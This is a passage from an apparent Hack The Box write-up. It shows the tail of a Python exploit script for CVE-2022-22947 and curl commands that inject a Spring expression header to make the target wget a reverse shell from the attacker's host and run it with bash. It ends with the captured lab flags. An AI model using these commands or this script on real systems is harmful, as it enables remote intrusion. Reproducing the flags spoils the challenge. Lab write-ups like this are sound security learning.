</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Error executing command&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>clean</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=nb>id</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>remove</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>delete</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s1>&#39;/actuator/gateway/routes/&#39;</span> <span class=o>+</span> <span class=nb>id</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=n>proxies</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>remove</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Stage removed!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Error: Fail to remove stage&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>banner</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    ###################################################
</span></span></span><span class=line><span class=cl><span class=s2>    #                                                 #
</span></span></span><span class=line><span class=cl><span class=s2>    #   Exploit for CVE-2022-22947                    #
</span></span></span><span class=line><span class=cl><span class=s2>    #   - Carlos Vieira (Crowsec)                     #
</span></span></span><span class=line><span class=cl><span class=s2>    #                                                 #
</span></span></span><span class=line><span class=cl><span class=s2>    #   Usage:                                        #
</span></span></span><span class=line><span class=cl><span class=s2>    #   python3 exploit.py &lt;url&gt; &lt;command&gt;            #
</span></span></span><span class=line><span class=cl><span class=s2>    #                                                 #
</span></span></span><span class=line><span class=cl><span class=s2>    #   Example:                                      #
</span></span></span><span class=line><span class=cl><span class=s2>    #   python3 exploit.py http://localhost:8080 &#39;id&#39; #
</span></span></span><span class=line><span class=cl><span class=s2>    #                                                 #
</span></span></span><span class=line><span class=cl><span class=s2>    ###################################################
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>banner</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Error: Invalid arguments&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Usage: python3 exploit.py &lt;url&gt; &lt;command&gt;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>url</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>command</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>exploit</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>command</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span> 
</span></span></code></pre></td></tr></table></div></div><p>After a lot of trial and error with running with <code>msfconsole</code> (the <code>Metasploit</code> CLI exploitation tool) as well as running the script locally, I finally gave up. Instead, I copied the portion of code responsible for the RCE and sent this via <code>curl</code>.</p><p>First I uploaded a reverse shell via a python HTTP server:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>curl -X POST  http://10.10.11.204:8080/functionRouter -H <span class=s1>&#39;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&#34;wget http://10.10.16.5:8000/oneline.rev -O /tmp/rev&#34;)&#39;</span> --data-raw <span class=s1>&#39;data&#39;</span> -v
</span></span></code></pre></div><p>Then I executed this file to spring a shell locally.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>curl -X POST  http://10.10.11.204:8080/functionRouter -H <span class=s1>&#39;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&#34;bash /tmp/rev&#34;)&#39;</span> --data-raw <span class=s1>&#39;data&#39;</span> -v 
</span></span></code></pre></div><p>Once you have access, just grab the flags!</p><h3 id=flags>Flags<a hidden class=anchor aria-hidden=true href=#flags>#</a></h3><p><strong>user.txt:</strong> <code>b46c9409c9d255bb02c1fd45e4ccf79a</code></p><p><strong>root.txt:</strong> <code>074bddbe556da944009a1493fdb18615</code></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://woadey.xyz/tags/path-traversal/>Path Traversal</a></li><li><a href=https://woadey.xyz/tags/ssh/>Ssh</a></li></ul><nav class=paginav><a class=prev href=https://woadey.xyz/posts/htb/easy/stocker/><span class=title>« Prev</span><br><span>HTB Writeup: Stocker</span>
</a><a class=next href=https://woadey.xyz/posts/cryptohack/public-key_cryptography/><span class=title>Next »</span><br><span>CryptoHack Writeup: Public-Key Cryptography</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://woadey.xyz/>woadey</a></span>
<span>· Theme: tweaked
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>